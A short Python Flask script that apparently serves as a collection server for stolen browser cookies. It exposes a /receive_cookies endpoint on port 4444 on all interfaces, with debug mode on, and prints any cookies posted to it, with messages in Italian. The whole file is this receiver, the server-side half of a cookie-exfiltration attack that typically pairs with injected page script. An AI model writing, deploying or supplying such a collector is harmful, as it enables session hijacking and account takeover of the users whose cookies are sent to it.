from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/receive_cookies', methods=['POST'])
def receive_cookies():
    try:
        data = request.get_json()
        if data and "cookies" in data:
            cookies = data["cookies"]
            print(f"Cookie ricevuti: {cookies}")
            return jsonify({"status": "success", "message": "Cookies ricevuti"}), 200
        else:
            return jsonify({"status": "error", "message": "Nessun cookie ricevuto"}), 400
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=4444, debug=True)
